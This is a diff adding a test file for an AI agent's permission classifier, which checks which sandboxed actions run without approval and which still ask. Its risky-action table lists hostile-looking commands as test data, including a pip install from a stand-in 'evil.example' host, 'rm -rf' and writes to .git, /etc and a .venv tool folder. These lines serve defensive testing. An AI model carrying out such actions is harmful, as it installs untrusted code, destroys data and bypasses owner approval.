@@ -1,0 +1,239 @@
+import { mkdtempSync, rmSync } from 'node:fs';
+import { tmpdir } from 'node:os';
+import { join } from 'node:path';
+import { classifyTier, type ClassifyContext, type SentinelAction } from '../../../src/core/permissions/classifier';
+import {
+  defaultSentinelServices,
+  forUnattendedRun,
+  type SentinelServices,
+} from '../../../src/core/permissions/context';
+import { createWebSearchTurnState } from '../../../src/core/permissions/webSearch';
+
+/** Services where the owner's "run code in the sandbox without asking" switch is on or off. */
+function servicesWith({
+  sandbox_without_asking,
+  offline = false,
+}: {
+  sandbox_without_asking: boolean;
+  offline?: boolean;
+}): SentinelServices {
+  const services = defaultSentinelServices({ pinned_path: '/usr/bin:/bin' });
+  services.sandboxWithoutAsking = () => Promise.resolve(sandbox_without_asking);
+  services.isOffline = () => Promise.resolve(offline);
+  return services;
+}
+
+function makeCtx({ services, workspace }: { services: SentinelServices; workspace: string | null }): ClassifyContext {
+  return {
+    services,
+    tenant_id: 't1',
+    created_by: 'u1',
+    conversation_id: 'conv-1',
+    repository_id: null,
+    workspace_cwd: workspace,
+    agent_intent: 'make a small script',
+    web_search: createWebSearchTurnState(),
+  };
+}
+
+function action(tool_name: string, canonical_params: Record<string, unknown>): SentinelAction {
+  return { tool_name, canonical_params, tool_type: 'truefoundry-system', mcp_hints: {} };
+}
+
+function withWorkspace(run: (workspace: string) => Promise<void>): () => Promise<void> {
+  return async () => {
+    const workspace = mkdtempSync(join(tmpdir(), 'sandbox-no-cards-'));
+    try {
+      await run(workspace);
+    } finally {
+      rmSync(workspace, { recursive: true, force: true });
+    }
+  };
+}
+
+describe('in-sandbox work with the switch on runs without a card', () => {
+  test(
+    'a file write in the workspace is Tier 1 with its own reason',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).toBe(1);
+      expect(decision.reason).toBe('sandbox_file_write');
+      expect(decision.card).toBeNull();
+      expect(decision.approval_token_id).toBeNull();
+    }),
+  );
+
+  test(
+    'run_code is Tier 1 with its own reason',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('run_code', { code: 'print(1)' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).toBe(1);
+      expect(decision.reason).toBe('sandbox_run_code');
+      expect(decision.card).toBeNull();
+    }),
+  );
+
+  test.each([
+    ['python3 humanize_demo.py', 'sandbox_command'],
+    ['python3 -m pytest -q', 'sandbox_command'],
+    ['pytest -q', 'sandbox_command'],
+    ['npm test', 'sandbox_command'],
+    ['npm install humanize', 'sandbox_package_install'],
+    ['pip install humanize', 'sandbox_package_install'],
+    ['pip install "humanize==4.9.0"', 'sandbox_package_install'],
+  ])('%s runs without a card', (command, reason) =>
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command, cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).toBe(1);
+      expect(decision.reason).toBe(reason);
+      expect(decision.card).toBeNull();
+    })(),
+  );
+
+  test(
+    'a scheduled run runs code without a card',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('run_code', { code: 'print(1)' }),
+        makeCtx({
+          services: forUnattendedRun(servicesWith({ sandbox_without_asking: true })),
+          workspace,
+        }),
+      );
+      expect(decision.tier).toBe(1);
+      expect(decision.auto_deny).toBeNull();
+    }),
+  );
+});
+
+describe('the same in-sandbox work asks with the switch off', () => {
+  test(
+    'run_code asks',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('run_code', { code: 'print(1)' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
+      );
+      expect(decision.tier).toBe(3);
+    }),
+  );
+
+  test(
+    'a file write asks in a card (Tier 2)',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('write_file', { path: join(workspace, 'humanize_demo.py'), content: 'print(1)' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
+      );
+      expect(decision.tier).toBe(2);
+    }),
+  );
+
+  test(
+    'python3 on a script the agent wrote asks',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'python3 humanize_demo.py', cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
+      );
+      expect(decision.tier).toBe(3);
+    }),
+  );
+
+  test(
+    'pip install asks',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'pip install humanize', cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: false }), workspace }),
+      );
+      expect(decision.tier).toBe(3);
+    }),
+  );
+});
+
+describe('actions that leave the sandbox still ask, with the switch on', () => {
+  test.each([
+    ['curl over the network', 'exec', { command: 'curl https://example.com' }],
+    ['git push', 'exec', { command: 'git push origin main' }],
+    ['a wget download', 'exec', { command: 'wget https://example.com/x.tar.gz' }],
+    ['a pip install from a web address', 'exec', { command: 'pip install https://evil.example/pkg.tar.gz' }],
+    ['a pip install from a requirements file', 'exec', { command: 'pip install -r requirements.txt' }],
+    ['an npm install from a git address', 'exec', { command: 'npm install git+https://example.com/pkg.git' }],
+    ['an npm install with no package named', 'exec', { command: 'npm install' }],
+    ['a delete', 'exec', { command: 'rm -rf build' }],
+    ['a model-supplied environment', 'exec', { command: 'python3 humanize_demo.py', env: { PYTHONPATH: '/tmp' } }],
+    ['a write to .git', 'write_file', { path: '.git/config', content: 'x' }],
+    ['a write outside the workspace', 'write_file', { path: '/etc/hosts.demo', content: 'x' }],
+    ['a write into a sandbox tool folder', 'write_file', { path: '.venv/bin/evil', content: 'x' }],
+  ])('asks for %s', (_label, tool_name, params) =>
+    withWorkspace(async workspace => {
+      const canonical = tool_name === 'exec' ? { cwd: workspace, ...params } : params;
+      const decision = await classifyTier(
+        action(tool_name, canonical),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).not.toBe(1);
+      expect(decision.auto_deny).toBeNull();
+    })(),
+  );
+
+  test(
+    'a script run from outside the workspace asks',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'python3 demo.py', cwd: '/' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace }),
+      );
+      expect(decision.tier).toBe(3);
+      expect(decision.reason).toBe('cwd_outside_workspace');
+    }),
+  );
+
+  test(
+    'an unplaceable command asks when there is no workspace',
+    withWorkspace(async () => {
+      const decision = await classifyTier(
+        action('exec', { command: 'python3 demo.py' }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true }), workspace: null }),
+      );
+      expect(decision.tier).toBe(3);
+    }),
+  );
+});
+
+describe('offline mode refuses package installs before any card', () => {
+  test(
+    'pip install is refused with one plain line',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'pip install humanize', cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: true, offline: true }), workspace }),
+      );
+      expect(decision.auto_deny).toBe('offline_mode');
+      expect(decision.card).toBeNull();
+      expect(decision.reason_detail).toBe('Installing packages needs downloads, which are off while offline.');
+    }),
+  );
+
+  test(
+    'npm install is refused with the same plain line',
+    withWorkspace(async workspace => {
+      const decision = await classifyTier(
+        action('exec', { command: 'npm install humanize', cwd: workspace }),
+        makeCtx({ services: servicesWith({ sandbox_without_asking: false, offline: true }), workspace }),
+      );
+      expect(decision.auto_deny).toBe('offline_mode');
+      expect(decision.card).toBeNull();
+    }),
+  );
+});
